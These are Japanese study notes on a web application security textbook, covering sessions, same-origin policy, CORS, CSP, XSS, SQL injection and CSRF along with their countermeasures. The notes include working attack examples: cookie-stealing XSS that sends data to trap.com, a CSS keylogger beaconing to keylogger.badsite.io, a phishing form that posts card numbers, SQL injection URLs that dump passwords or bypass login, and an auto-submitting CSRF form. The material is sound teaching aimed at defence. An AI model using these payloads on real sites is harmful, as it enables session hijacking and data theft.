# 『体系的に学ぶ安全なWebアプリケーションの作り方』(徳丸浩)

# Webアプリケーションの脆弱性とは

脆弱性とは悪用できるバグ（セキュリティバグ）のこと。
単に遅いとか、計算結果を間違えるとかは普通のバグ。

悪用できるバグの例

* 個人情報などの秘密情報を閲覧する
* Webサイトの内容を書き換える
* 他人に成り済まして買い物をする

# 脆弱性の問題点

## 経済的損失
* 利用者が受けた被害の補償
* 迷惑料
* Webサイト停止による機会損失
* 信用失墜による売り上げの減少

## 法的な要求
個人情報保護法
5000件を越える個人情報を保持する事業者は個人情報取り扱い事業者として安全管理措置を講じる義務がある。

### 2015/9/4 個人情報保護法の改正 2017/5/30施行
* 欧州連合レベルに合わせるため
*「5000件を越える」が撤廃される
    * 小規模事業者の事業活動が円滑に行われるよう配慮
* [個人情報の保護に関するガイドライン](http://www.meti.go.jp/policy/it_policy/privacy/downloadfiles/161228kojoguideline.pdf)
* 個人識別符号の定義

### 2018/5/4 EUでGDPR(一般データ保護規則 : General Data Protection Regulation)施行
[富士通マーケティング 欧州連合における個人情報保護の枠組みGDPR、その現状と対策のポイント](http://www.fujitsu.com/jp/group/fjm/mikata/column/sawa2/001.html)

* 適切なプライバシーポリシーの提供(明示的な同意など)
* 忘れられる権利
* データ・ポータビリティの権利(別のサービスに移動したいと言われれば対応しないといけない)
* プロファイリングの拒否

* EUを含む欧州経済領域(EEA)内の個人情報を扱う全ての企業、団体、機関が対象
* 原則、EUにある支店から日本の本店に情報を移転できない
    * EUのデータ保護機関から承認を得る
* 違反すると全世界年間売り上げの4%以下または2000万ユーロ(1ユーロ=130円なら26億円)以下の高い方
* 情報漏洩したときに当局へ報告しない、本人の求めに応じた個人情報の訂正をしない場合も制裁の対象となるかも

## 利用者が回復不可能なダメージを受ける場合が多い
## ボットネットワーク構築に加担する
* DOS攻撃に加担
* 仮想通貨のマイニングをさせるマルウェア

# HTTPとセッション管理

## GETとPOSTの使い分け
ガイドライン
* GETはリソースの取得のみに用いる
* GETは副作用がないことが期待される(巾等性：複数回操作しても1回操作したのと同じ結果になること)
* 秘密情報の送信はPOSTを用いる
    * GETを使うとURL上に指定されたパラメータがReferer経由で外部に漏洩する
    * URL上に指定されたパラメータがアクセスログに残る

## hiddenパラメータ
HTTPはステートレス（状態を持たない）ためクライアントの情報はhiddenパラメータに記録する
* ブラウザから送信する値は（利用者自身が）書き換えられる
    * 認証、認可に関する情報はセッション変数に保存すべき
* 情報漏洩や第三者の改竄には堅牢
    * ログイン前の状態の情報はhiddenパラメータを使う

## 認証と認可
* 認証（Authentication）: 利用者が本人であることを確認する
* 認可（Authorization） : 認証された利用者に権限を与える

## クッキーとセッション管理

* セッション管理
    * ログイン後にアプリケーションの状態を覚えておくこと
* セッション管理のためにクッキー(整理番号)を使う

* サーバがセッションIDを生成し`Set-Cookie:`でブラウザに記憶させるよう通達する
* ブラウザはサーバにアクセスするときそのクッキーの値をサーバに送る

### クッキーの要件
* 第三者がセッションIDを推測できないこと
    * 暗号論的擬似乱数生成器を用いてセッションIDを作る
    * Webアプリケーション開発ツールが提供するセッション管理ライブラリを用いる
* 第三者からセッションIDを強制されないこと
    * 認証後にセッションIDを変更すること
    * しないとセッションIDの固定化攻撃がある
        * 攻撃者→サーバ
        * サーバはIDを攻撃者に発行
        * ユーザがサーバにつなごうとしたところで攻撃者がIDをユーザに渡す
        * ユーザはそのIDで認証する
        * ユーザが認証後、攻撃者はサーバにそのIDを使って操作する
    * 認証後にセッションIDが変更された場合
        * ユーザがIDで認証したときにサーバが新しいID'を発行するので攻撃者はその後IDを使えない
* 第三者にセッションIDが漏洩しないこと
    * クッキー発行の属性に不備がある
    * ネットワークが盗聴される(SSLを使うこと)
    * XSSなどの脆弱性

### クッキーの属性
* domain属性は設定しないのが一番攻撃範囲が狭い
* secure属性をつけるとSSLのときのみ送信される
* httpOnlyをつけるとJavaScriptで読めない

# 受動的攻撃と同一生成元ポリシー

## 能動的攻撃と受動的攻撃

### 能動的攻撃
攻撃者がサーバを直接攻撃する

### 受動的攻撃
攻撃者がサーバの利用者に罠を仕掛けて間接的にサーバを攻撃する

* 単純な受動的攻撃
    * 怪しいサイトを閲覧して(ブラウザなどの脆弱性により)マルウェアに感染する
* 正規サイトを悪用する受動的攻撃
    * 攻撃者→サイト ; コンテンツに罠をしかける
    * 利用者→サイト ; 罠が発動して攻撃を受ける
* サイトをまたがった受動的攻撃(CSS, CSRFなど)
    * 利用者→罠サイト ; 罠を含むコンテンツを取得
    * 攻撃者→正規サイト ; 罠が発動して不正操作をする

### サンドボックス
ブラウザ内部でJavaScriptができることを制限する
* ローカルファイルへのアクセス禁止
* プリンタなどの資源の利用禁止
* ネットワークアクセスの制限(同一生成元ポリシー)

### iframe
* iframeを使うとHTML(外)の中に別のHTML(内)を埋め込める
* (外)と(内)のホストが同一ならJavaScriptを用いて(外)から(内)のデータにアクセスできる
* 同一生成元ポリシーがないと罠HTML(外)の中にiframeで正規のHTML(内)を埋めると、(内)の秘密情報にアクセスできてしまう
* XMLHttpRequestでアクセスできるURLも同じ制約がある

### アプリの脆弱性と受動攻撃
* XSSがあると同一生成元ポリシーが回避されることがある
* iframeの内側にJavaScriptを送り込み、それが(内)の情報を取得する

### 第三者のJavaScript
* サイト運営者が第三者を信頼して実行するJavaScript
    * アクセス解析、バナー広告、ブログパーツなど
    * 提供元が意図的に個人情報を収集する可能性
    * 脆弱性によりJavaScriptが差し替えられる可能性
    * 提供されたJavaScriptの脆弱性

### X-Frame-Options
* クリックジャック攻撃対策
* クリックジャック攻撃
ページの要素を隠蔽・偽装してクリックを誘って利用者の意図しない動作をさせようとする攻撃

* X-Frame-Optionsに設定可能な値
    * DENY ; ページをフレーム内に表示できない
    * SAMEORIGIN ; 自分と生成元が同じフレームに限りページを表示可能
    * ALLOW-FROM uri ; 指定された生成元に限りページを表示可能

### JavaScript以外のクロスドメインアクセス
* img要素
    * img要素のsrc属性はクロスドメイン可能
    * 意図しないサイトに画像が貼られるのを禁止したいならRefererをチェックする方法がある
        * Refererをオフにしてると見えなくなる
* script要素
    * script要素のsrc属性はクロスドメイン可能
    * サイトAからサイトBのJavaScriptを読むときBに対するクッキーが送信される
        * サイトBはその情報を使って応答を変えられる
        * JSONPでは公開情報のみを提供するようにすべき
* CSS
    * クロスドメインで読み込み可能

### [no-csp-css-keylogger.badsite.io](https://no-csp-css-keylogger.badsite.io/)
CSSを使ってkeyloggerを実現する

基本アイデアinputタグのvalueの値に応じて読み込むバックグラウンドイメージのURLを変える
```
<style>
input[value=" "] { background-image: url("//keylogger.badsite.io/+"); }
input[value$="  "] { background-image: url("//keylogger.badsite.io/++"); }
input[value$=" !"] { background-image: url("//keylogger.badsite.io/+%21"); }
input[value$=" \""] { background-image: url("//keylogger.badsite.io/+%22"); }
...

input[value$="~|"] { background-image: url("//keylogger.badsite.io/%7E%7C"); }
input[value$="~}"] { background-image: url("//keylogger.badsite.io/%7E%7D"); }
input[value$="~~"] { background-image: url("//keylogger.badsite.io/%7E%7E"); }
</style>
```
keylogger.badsite.ioでアクセスを見て入力文字を知る

# オリジン間リソース共有（[CORS:Cross-Origin Resource Sharing](https://developer.mozilla.org/ja/docs/Web/HTTP/HTTP_access_control)）
* 同一生成元ポリシーは安全だけど窮屈なこともしばしば
    * `<img>`, `<video>`, `<audio>`などは異なるオリジンに埋め込める
    * XMLHttpRequestやFetch APIは同一生成元ポリシーに従う
* CORSはクライアントが現在のサイトとは別のドメインのリソースにアクセスする権限を得られる仕組み
* 2014にW3C勧告
* ブラウザはオリジン間HTTPリクエストを発行する

## 簡単な例
* `http://sample1.com`のコンテンツがXMLHttpRequestを用いて`http://sample2.com`のコンテンツを取得したい
* ブラウザはGETメソッドに`Origin: http://sample1.com`を追加して送信
* サーバは`Access-Control-Allow-Origin: *`を返答
* ブラウザは`http://sample1.com`のコンテンツを取得可能

### ドメイン制限

* `Access-Control-Allow-Origin: <origin>`とすると`<origin>`のURIのみアクセスしてよい

### ブラウザのJavaScriptの例
```
fetch('http://sample2.com', {
  mode: 'cors'
}).then(...)
```

### サーバの動作
* クライアントから送られた`Origin: <origin>`の`<origin>`を確認して問題なければ
```
Access-Control-Allow-Origin: <origin>
```
というヘッダを追加する

# [CSP(Content Security Policy)](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP)

* XSSなどの攻撃対策の一つ
* サーバが`Content-Security-Policy`ヘッダを返すことでCSPが有効になる
    * ブラウザの挙動を制限する
    * 実行を許可するスクリプトのドメインを指定
        * 全てのスクリプトの実行を拒否することも可能
    * 通信プロトコルの指定
        * 全てのコンテンツをHTTPSのみにする
        * 全てのCookieにsecureフラグをつける
        * HTTPからHTTPSへのリダイレクト
        * 暗号化された通信路のみを用いるようにする

## ポリシーの設定
```
Content-Security-Policy: <policy-derective>
```

### 全てのコンテンツを自身のサイト(サブドメインは含まない)からのみ取得可能にする
```
Content-Security-Policy: default-src 'self'
```

* `<script>コード</script>`は禁止される
    * `unsafe-inline`で許可
* `<script src="自身と同じURI"></script>`のみOK
* eval禁止
    * `unsafe-eval`をつけると許可


### 自身のサイトと信頼された別のドメインを指定
```
Content-Security-Policy: default-src 'self' *.trusted.com
```

### スクリプト、メディア、画像をそれぞれ指定する(本当は一行)
```
Content-Security-Policy: default-src 'self';
  img-src *;
  media-src media1.com media2.com;
  script-src trusted.com
```
img画像は任意, メディアはmedia1.com, media2.comのみ, スクリプトはtrusted.comのみ

### スクリプトをHTTPSのドメインにのみ制限
```
Content-Security-Policy: default-src https://trusted.com
```

# 4 Webアプリケーションの機能別に見るセキュリティバグ

## 脆弱性の発生場所

### Webアプリケーションの機能

```
ブラウザ
↓
HTTPリクエスト
↓
入力値検証
↓
├ブラウザ ; XSS, HTTPヘッダインジェクション
├RDB      ; SQLインジェクション
├シェル   ; OSコマンドインジェクション
├メール   ; メールヘッダインジェクション
├ファイル ; ディレクトリトラバーサル
```

### インジェクション系脆弱性

脆弱性名                     | インタフェース | 悪用手口                | データの終端
-----------------------------|----------------|-------------------------|-------------
XSS                          |HTML            |JavaScript               | <"
HTTPヘッダインジェクション   |HTTP            |HTTPレスポンスヘッダ     | 改行
SQLインジェクション          |SQL             |SQL命令の注入            | '
OSコマンドインジェクション   |シェルスクリプト|コマンドの注入           | ;|
メールヘッダインジェクション |sendmailコマンド|ヘッダや本文の注入・改変 | 改行

## 入力処理とセキュリティ

Webアプリケーションの入力とはHTTPリクエストとして渡されるパラメータ

### 入力処理

* 文字エンコーディングの妥当性検証
    * 文字コードを使った攻撃手法がある
    * 最近はUTF-8のみにしてしまうことが多い
* 文字エンコーディングの変換
    * cp932(Shift_JIS))をUTF-8に変換する
* パラメータ文字列の妥当性検証

## 4-2 入力処理とセキュリティ

### 目的
利用者の入力ミスや、データの不整合を防いでシステムの信頼性を向上させる

* 数値のみの項目に英字や記号が入っていないか
* 長すぎるデータ・とても未来の日付
* 更新処理の途中でエラーになっていないか
* 入力者が多数の項目を入力してからエラーになって全部やり直すのは辛い
* パスワード未入力なのにメール送信処理を実行する

セキュリティに対する根本対策ではない(セーフティネットの一つではある)

### バイナリセーフ
* 値0の1byte(ヌルバイト)を含むデータ列を安全に処理できること
* ヌルバイトはCで特別扱いされるため正しく処理できないことが多いため
* 入力値にヌルバイトが含まれていればエラーにする(全ての文字を許容する仕様だと使えない)

### 入力検証対象のパラメータ
* 全てのパラメータ(hiddenパラメータ、ラジオボタン、select要素、クッキーの値など)

## 4-3 表示処理に伴う問題
Webアプリケーションに外部からの入力に応じて表示が変化する部分があり、
そのHTML生成の実装に問題があるとXSSが発生する

* ブラウザ上で攻撃者が用意したスクリプトが実行されてクッキーを盗まれる
* ブラウザ上で攻撃者が用意したスクリプトが実行されてWebアプリの機能を悪用される
* Webサイトに偽の入力フォームが表示されてフィッシングの被害を受ける

### XSSによるクッキー値の表示
PHPの例
```
<?php echo $_GET['keyword']; ?>
```
に
```
keyword=<script>alert(document.cookie)</script>
```
を指定するとセッションIDが表示される

### 受動的攻撃により他人のクッキー値を盗む
罠サイト(`http://trap.com/`)の中にiframeで標的サイト(`http://target.com/`))のページを表示させる
```
<html><body>
<iframe src="http://target.com/?keyword=<script>window.location='http://trap.com/?id='%2Bdocument.cookie</script>">
</iframe>
</body></html>
```

* このサイトに攻撃者を誘導する
* iframeの中でkeyword以下の次のスクリプトが実行される
```
<script>
window.location='http://trap.com/?id='+document.cookie
</script>
```

* `http://trap.com/?id=セッションID`に遷移してtrap.comにログが残る

### JavaScriptを使わないXSSの例
ログイン機能の無いサイトのXSS脆弱性の悪用

* XSS脆弱性がある粗大ゴミ受け付けサイト(target.com)
```
<form method="POST">
氏名<input name="name" value="<?php echo @$_POST['name']; ?>">
<input type=submit value="申し込み">
</form>
```
* このサイトを利用して罠サイトを作成する

```
<html><body>
<form action="https://target.com/" method="POST">
<input name="name" type="hideen" value='"></form><form style=... action=http://trap.com method=POST>
カード番号<input name=card><input value=申し込み type=submit></form>'>

<input style=... type="submit" value="粗大ゴミ申し込み">
</form>
</body></html>
```

* これは粗大ゴミ申し込みサイトへのリンクに見える
* クリックすると`https://target.com`のサイトに移動する
* 元のフォームが隠されて新しい`form`が開始する
```
<form style=... action=http://trap.com method=POST>
カード番号<input name=card>
<input value=申し込み type=submit>
</form>
```
* styleにより元のフォームを隠してactionのURLに罠サイト(`http://trap.com`)を指定する

### 反射型XSSと持続型XSS
* 反射型(reflected)XSS 攻撃用JavaScriptが攻撃対象サイトとは別のサイトにある場合
    * 入力値をそのまま表示するページで発生することが多い
    * 罠サイトへの誘導が必要
* 持続型(stored/persistent)XSS
    * 攻撃用JavaScriptが攻撃対象のデータベースなどに保存される場合
    * WebメールやSNSなどで発生しやすい
    * 罠サイトへの誘導が不要で攻撃しやすい
* DOMベースXSS
    * サーバを経由せずにJavaScriptのみで表示しているパラメータがあるページに発生する

### 脆弱性が生まれる原因

* HTML生成のときにメタ文字を正しく扱わないため
* メタ文字を文字そのものとして扱うエスケープ処理が必要

エスケープ方法

置かれている場所|解釈されるもの |終端文字|エスケープ方法
----------------|---------------|--------|--------------------------------------
要素内容        |タグと文字参照 |  <     |<と&を文字参照にする
属性値          |文字参照       |  "     |属性値を"で囲み<と"と&を文字参照にする

### 引用符で囲まない属性値のXSS

```
<input type=text name=mail value=<?php echo $_GET['p']; ?>>
```

* `p`に`1+onmouseover%3dalert(document.cookie)`を与える
* 上記inputは次のように展開される

```
<input type=text name=mail value=1 onmouseover=alert(document.cookie)>
```
* 属性値を引用符で囲まないと空白スペースが属性値の終わりになる
* 空白を挟んで属性値を追加できる

### 引用符で囲っていても"をエスケープしないとXSS
```
<input type="text" name="mail" value="<?php echo $_GET['p']; ?>">
```
* `p`に"+onmouseover%3d"alert(document.cookie)`を与える
* 上記inputは次のように展開される
```
<input type="text" name="mail" value="" onmouseover="alert(document.cookie)">
```

### 対策
再掲
* 要素内容は「<」と「&」をエスケープする
* 属性値は""でくくって「<」と「"」と「&」をエスケープする
* (エンコーディング)`Content-Type: text/html; charset=UTF-8'`で文字エンコーディングを固定する

## 発展編
```
<html>
<body onload="init('xxx')">
<form ...>
<input name="tel" value="012-345-6789">
<input type="submit">
</form>
<a href="http://sample.com">xxx</a>
<p>
text
<p>
<script>
document.write('xxx')
</script>
</form>
</html>
```

置かれている場所            |解釈されるもの |終端文字|エスケープ方法
----------------------------|---------------|--------|--------------------------------------
要素内容                    |タグと文字参照 |  <     |<と&を文字参照にする
属性値                      |文字参照       |  "     |属性値を"で囲み<と"と&を文字参照にする
属性値(URL)                 |同上           |同上    |URLの形式を検査してから属性値としてエスケープ
イベントハンドラ            |同上           |同上    |JavaScriptとしてエスケープしてから属性値としてエスケープ
script要素内の文字列リテラル|解釈されない   |</      |JavaScriptとしてエスケープし「</」が出ないように配慮

## href属性やsrc属性のXSS
* a要素のhref属性, img要素, frame要素のsrc属性などはURLを属性値としてとる
* このURLには`javascript:JavaScript式`を指定してJavaScriptを起動できる

```
<body>
<a href="<?php echo htmlspecialchars($_GET['url']); ?>">bookmark</a>
</body>
```
を`http://trap.com/?url=javascript:alert(document.cookie)`で起動すると

```
<body>
<a href="javascript:alert(document.cookie)">bookmark</a>
</body>
```
になる. このリンクを選択するとJavaScriptが起動する

### URLを生成する場合の対策
* httpまたはhttpsスキームのみを許可するようにチェックする
* `http:`または`https:`または`/`で始まる相対URLしか許容しない

### リンク先ドメインのチェック
* リンク先ドメインが外部ドメインならエラーにする
* または 外部ドメインへのリンクであることを利用者に注意喚起する

## JavaScriptの動的生成

### イベントハンドラのXSS
XSSがある例(JavaScriptの文字列リテラルのエスケープが抜けている)
```
<body onload="init('<?php echo htmlspecialchars($_GET['name'], ENT_QUOTES) ?>')">
</body>
```
`name=');alert(document.cookie)//`を渡して起動すると
```
<body onload="init('&#039;);alert(document.cookie)//')">
```
となる. onloadイベントハンドラは属性値の文字列参照を解釈するので
```
init('');alert(document.cookie)//')
```
が実行される

* データをJavaScript文字列リテラルとしてエスケープする
    * \ → \\\\
    * ' → \\'
    * " → \\"
    * 改行 → \n
* その結果をHTMLエスケープする

先ほどの場合は`name=\';alert(document.cookie)//`を渡すので

```
<body onload="init('\&#039;);alert(document.cookie)//')">
```
となる. onloadイベントハンドラは
```
init('\');alert(document.cookie)//')
```
と解釈される(多分エラー)

### script要素のXSS
* script要素内はタグや文字参照を解釈しないのでHTMLとしてのエスケープは不要
* JavaScriptの文字列リテラルとしてエスケープ
* が、これだけでは不十分
```
<?php
/* 「\」,「'」, 「"」の前に「\」を挿入してJavaScript文字列としてエスケープ */
function escape_js($s) {
  return mb_ereg_replace('([\\\\\'"])', '\\\1', $s);
}
?>
<body>
<script src="jquery.js"></script>
こんにちは<span id="name"></span>さん
<script>
  $('#name').text('<?php echo escape_js($_GET['name']); ?>');
</script>
</body>
```

JavaScriptは文脈を見ずに`</script>`がでると終わる
```
<script>
  foo('</script>')
</script>
```
この例では`foo('`が実行される(そしてエラー)

* `</script><script>alert(document.cookie)//`を渡すと
```
<script>
  </script><script>alert(document.cookie)//
</script>
```
となってXSSが成功する

* 生成するJavaScriptに`</`が入らないように気を付ける

### まとめ
* JavaScriptの文法から「"」「'」「\」「改行」の前に「\」を入れる
* イベントハンドラの場合は文字参照をHTMLエスケープして「"」で囲む
* script要素の場合は「</」が出ないようにする

ルールが複雑なためJavaScriptの動的生成はしない

それでも動的パラメータをJavaScriptに渡したい場合

### Unicodeエスケープ
英数字と「-」「.」以外を全て\uXXXXという形に変換する

### script要素の外部でパラメータを定義してJavaScriptから参照する
hiddenパラメータを利用して動的生成をさける

```
<input type="hidden" id="js_name" value="<?php echo htmlspecialchars($name, ENT_COMPAT, 'UTF-8'); ?>">
<script>
const name = document.getElementById('js_name').value
...
</script>
```
属性値のエスケープの原則だけ守ればよいのでルールがシンプルになる

## DOMベースXSS
JavaScriptのクライアント側での処理の問題(サーバで生成したHTMLには攻撃者の注入したJavaScriptは現れない)
```
<body>
こんにちは
<script>
document.URL.match(/name=([^&]*)/)
document.write(unescape(RegExp.$1))
</script>
</body>
```
はクエリー文字`name=`に指定した名前を表示する

```
http://sample.com/?name=<script>alert(document.cookie)</script>
```
はJavaScriptが実行される

# SQL呼び出しに伴う脆弱性

## SQLインジェクション

SQLインジェクション : SQLの呼び出し方に不備がある場合に発生する脆弱性

## 想定される影響
* データベース(以下DB)内の情報が盗まれる
* DBの内容が書き換えられる
* 認証を回避される
* DB上のファイルの読み書き、プログラムの実行など

SQLインジェクションは絶対に起こらないようにする必要がある

対策 : 静的プレースホルダを利用してSQLを呼び出す

## エラーメッセージ経由の情報漏洩

```
<?php
$author = $_GET['author'];
$con = pg_connect(...)
$sqlstm = "SELECT id, title, author, publisher, date, price FROM books WHERE author = '$author' ORDER BY id";
...
```
このページを
```
http://sample.com/?author='+and+cast((select+id||':'||pwd+from+users+offset+0+limit+1)+as+integer)>1--
```
でアクセスすると
```
WHERE author = '' and cast((select id||':'||pwd from users offset 0 limit 1) as integer)...
```
というSQLになる。これは表の先頭のidとpwdを':'で連結して文字列にしてintegerにしようとしてエラーになる。
その結果

```
Warning pg_query()...入力構文が無効です:"yamada:pass1" in...
```
とエラーメッセージの中にパスワードが表示される。

エラーメッセージに内部的なエラー内容を含ませないようにする。

## UNION SELECTを用いた情報漏洩

UNION SELECTは2個のSQL文の結果の和集合を求める演算
先ほどのページを

```
http://sample.com?author='+union+select+id,pwd,name,addr,null,null,null+from+users--
```
でアクセスすると(本のID, タイトル, 著者名, 出版社)のところに(ユーザID, パスワード, 名前, 住所)が表示されてしまう。

UNION SELECTによる攻撃は一度に大量の情報が漏洩させられる可能性がある。

## SQLインジェクションによる認証回避

ログイン画面

```
<form action="login.php" method="POST">
  ユーザ名<input type="text" name="id"><br>
  パスワード<input type="text" name="pwd"><br>
  <input type="submit" value="ログイン">
</form>
```

ログイン処理

```
<?php
  session_start();
  $id = @$_POST['id'];
  $pwd = @$_POST['pwd'];
  $con = pg_connect8"...");
  $sql = "SELECT * FROM users WHERE id='$id' and pwd = '$pwd'";
  $rs = pg_query($con, "sql);
?>

...
if (pg_num_rows($rs) > 0) {... SELECTの結果が空でなければログイン成功
```

パスワードを`' or 'a'='a`にするとSQLは

```
SELECT * FROM users WHERE id='$id' and pwd = '' or 'a'='a'
```
となりWHERE句がtrueとなりログインできる

## SQLインジェクション攻撃によるデータ改竄

```
http://sample.com/?author=';update+books+set+title%3D'<>cracked!</i>'+where+id%3d'1001'--
```

次のSQLが実行される

```
SELECT * FROM books WHERE author=''; update books set title='<i>craced!</i>' where id='1001'--'ORDER BY id
```

## その他の攻撃
SQLの拡張機能でOSのコマンド実行やファイルの読み書きなどができることもある。


# 脆弱性の原因

開発者の意図しない形にSQL文が改変されることで発生する。

## 文字列リテラルの問題
ルール
* SQLの文字列リテラルはシングルクォート'で文字列を囲む。
* 文字列の中にシングルクォートを入れる場合はシングルクォートを重ねる。

「O'Reilly」は「'O''Reilly'」になる。

シングルクォートの処理を忘れると

```
SELECT * FROM books WHERE author='O'Reilly'
```

となる。`author='O'`で終わって残りの`Reilly'`でエラー。
この部分がSQL文として意味があると攻撃になる。

## 数値項目

```
SELECT * FROM employees WHERE age < $age
```

の`$age`に`1;DELETE FROM employees`が入ると

```
SELECT * FROM employees WHERE age < 1;DELETE FROM employees
```

となり;の後ろが実行される。

# 対策

SQL文を組み立てるときにSQL文の変更を防ぐ
* プレースホルダでSQL文を組み立てる
* リテラルを正しく構成してSQL文が変更されないようにする

二つ目は難しいので一つ目で行うのがよい。

```
SELECT * FROM books WHERE author = ? ORDER BY id
```

?を使ってSQL文を組み立てる。

* 静的プレースホルダ
    * 値のバインドをDB側で行う
    * プレースホルダの状態でSQL文がコンパイルされるので後からSQL文が変更されることはない
* 動的プレースホルダ
    * SQLを呼び出すライブラリが適切にバインドしてSQLを構成する
    * ライブラリにバグがなければ安全

## LIKE述語とワイルドカード

LIKE述語の検索パターン
* `_`は任意の一文字にマッチ
* `%`はゼロ個以上の任意の文字列にマッチ

LIEK述語ではこれらのワイルドカード文字をエスケープする必要がある

SQLインジェクションではないが忘れると攻撃される可能性がある

```
WHERE name LIKE '%山田%'
```

## プレースホルダを用いた処理

### 検索条件が動的に変わる場合

「?」を含んだSQL文を文字列連結で動的に生成し、実パラメータをSQL呼び出しのときにバインドすると安全

### 様々な条件でのソート

ORDER BY句で列をソートする場合、

```
SELECT * FROM books ORDER BY $row
```

とすると`$row`に`cast((select id||':'||pwd FROM users limit 1) as integer)`が入ると攻撃される。

```
ERROR: 型intgerの入力構文が無効です: "yamada:pass1"
```

対策 : 指定可能な列名かどうかを確認してORDER BY句を組み立てる

## SQLインジェクションの保険的対策

ミドルウェアに脆弱性があった場合に攻撃の被害を低減する対策

* 詳細なエラーメッセージの抑止
    * SQLのエラー表示は攻撃者に情報を提供しやすい
* 入力値の妥当性検証
    * 数値しか入らない場合は数値のみであることをチェック
* DBの権限設定
    * アプリを実現する必要最小限の権限のみをDBに与える

# 重要な処理の際に混入する脆弱性

ここではログインした利用者が取り消しできない処理のことを重要な処理と呼ぶ。
特定副作用と呼ばれることもある。

重要な処理に脆弱性があるとクロスサイト・リクエストフォージェリ(CSRF:Cross-Site Request Forgeries)脆弱性の可能性がある。

## CSRF
* 重要な処理では利用者の意図した操作であることを確認する必要がある。
* 確認処理が抜けると意図せずに実行されることがある。

### 例
利用者のアカウントによる
* 物品の購入
* 退会処理
* 掲示板への書き込み
* パスワードやパスワードの変更

### パスワード変更画面でのCSRF攻撃

```
// パスワード入力画面
<?php
  session_start();
  // ログイン確認
  ...
?>
<body>
  <form action="change.php" method="POST">
  新しいパスワード<input name="pwd" type="password"><br>
  <input type="submit" value="パスワード変更">
  </form>
</body>
```

```
// change.php
<?php
  session_start();
  $id = @$_SESSION['id']; // ユーザIDの取り出し
  // ログイン確認
  ...
  $pwd = $_POST['pwd']; // パスワード取得
  // ユーザ$idのパスワードを$pwdに変更する
```

パスワードが変更される条件

* POSTメソッドでchange.phpがリクエストされる
* ログイン状態である
* POSTパラメータにpwdとしてパスワードが指定される

CSRF攻撃

```
// attack.html
<body onload="document.forms[0].submit()">
  <form action="change.php" method="POST">
    <input type="hidden" name="pwd" value="cracked">
  </form>
</body>
```

* ユーザが正規のサイト(target.jp)にログインしている
* 攻撃者の誘導でユーザがattack.htmlを閲覧する
    * iframeを用いて外側に罠サイト, 内側にtarget.jpを非表示で入れる
    * 外側から内側の情報を取得することはできない
* 罠のJavaScriptがtarget.jpからchange.phpにパスワード変更リクエストをPOSTする
    * 攻撃対象サイトのセッションIDが付与されている
* パスワードが変更される

## CSRFとXSSの比較

![CSRF](csrf-1.svg)
![XSS](xss-1.svg)

* CSRFよりXSSの方が攻撃範囲が広い
* CSRFは設計段階から対策が必要

## 確認画面がある場合のCSRF攻撃

確認画面から実行画面へのデータの渡し方
* hiddenパラメータを使う
* セッション変数を使う

### hiddenパラメータを使う場合

```
// 入力画面
[パスワード]
    [確認]

      ↓ POST
         // <input type="text" name="pwd" value="pass1">

// 確認画面
[パスワード]
    [変更]

      ↓ hiddenパラメータ
         // <input type="hidden" name="pwd" value="pass1">

// 実行画面
パスワードを変更しました

```
* 実行画面が入力としてパスワードを受け取っている
* この場合のCSRF攻撃は確認画面がない場合と同じ

## セッション変数でパラメータを受け渡ししている場合

```
// 入力画面
[パスワード]
    [確認]

      ↓ POST
         // <input type="text" name="pwd" value="pass1">

// 確認画面
[パスワード] // パスワードをセッション変数に保存
    [変更]   // $_SESSION['pwd'] = $_POST['pwd']

      ↓ // セッション変数からパスワードを取り出す
         // $pwd = $_SESSION['pwd']
```

2段階の攻撃が必要

* 確認画面に対してパスワードをPOSTしてセッション変数にパスワードをセットする
* タイミングをみて実行画面を呼び出す

### iframを使う方法

```
罠サイト
カモフラージュ用コンテンツ

ifram1(即時呼び出し)
┌─────┐
│確認画面に│
│psをPOST  │
└─────┘

ifram2(10秒後に呼び出し)
┌─────┐
│実行画面を│
│呼び出す  │
└─────┘
```
* 罠サイトの閲覧と同時にiframe1を呼び出し確認画面にpsをPOST
* セッション変数にpsが設定される
* 10秒後にCSRF攻撃

### 内部ネットワークに対するCSRF攻撃

ルータやファイアウォール(FW)の設定画面のCSRF

* 管理端末から罠を閲覧するとルータやFWの設定を不正に変更される可能性
* 内部システムであっても脆弱性を放置するのは危険

## 脆弱性が生まれる原因

* form要素のaction属性に任意のドメインが指定可能
    * 罠サイトから攻撃対象サイトにリクエストを更新可能
* クッキーに保存されたセッションIDは対象サイトに自動的に送信される
    * 罠経由のリクエストに対してもセッションIDが送信される(認証された状態で攻撃リクエストが送信される)

### 利用者の意図したHTTPリクエスト
```
POST /change.php HTTP/1.1
Referer: http://target.com/
Content-Type: ...

pwd=pass1
```

### CSRF攻撃によるHTTPリクエスト
```
POST /change.php HTTP/1.1
Referer: http://trap.com/...
Content-Type: ...

pwd=pass1
```

* Refererフィールドのみが異なる
* 通常のWebアプリケーションはRefererフィールドをチェックしない
    * 正規利用者の意図したリクエストであることを確認していない
    * CSRF脆弱性が混入

* クッキーによるセッション管理以外でも自動的に送信されるパラメータを使っているとCSRF脆弱性の可能性
* HTTP認証, SSLクライアント認証など

## CSRF対策
「重要な処理」に対するリクエストが正規利用者の意図したものであることを確認する必要がある
* CSRF対策の必要なページを列挙する
* 正規利用者の意図したリクエストを区別できるように実装する

### CSRF対策の必要なページを列挙する
* ECサイトで商品リスト、検索などはCSRF対策不要
* 物品購入、パスワード変更、個人情報編集などの確定画面はCSRF対策必要
* 「商品の追加」はその後購入時に「確認」があれば対策しなくてもよいかもしれない
    * 外部から商品追加させたい場合は確認しない方が便利

### 正規利用者の意図したリクエストであることの確認

* 正規サイトのボタンを押したリクエストは意図したリクエスト
* 罠サイトを閲覧して自動的に送信されたリクエストは意図しないリクエスト

両者の判定方法
* 秘密情報(トークン)の埋め込み
* パスワード再入力
* Refererのチェック

### 秘密情報(トークン)の埋め込み

CSRF対策が必要なページに対して第三者が知らない秘密情報(=トークン)を要求することで不正なリクエストを識別する
* セッションIDをトークンとして利用する
* リクエストはPOSTにする
    * GETだとクエリパラメータにトークンが入ってしまう可能性がある
    * Refererで機密情報が外部に漏れる可能性がある

```
// 確認画面
<form action="change.php" method="POST">
  新パスワード<input name="pwd" type="password"><br>
  <input type="hidden" name="token"
   value="<?php echo htmlspecialchars(session_id(), ENT_COMPAT, 'UTF-8'); ?>">
  <input type="submit" value="パスワード変更">
</form>
```

```
// トークン確認
session_start();
if (session_id() !== $_POST['token']) {
  die('正規の画面から利用してください');
}
```

### トークンとワンタイムトークン
ワンタイムトークンは一度しか使わない使い捨てのトークン

・ワンタイムトークンはリプレイ攻撃に対して有効
・CSRF攻撃に対してワンタイムは意味がない
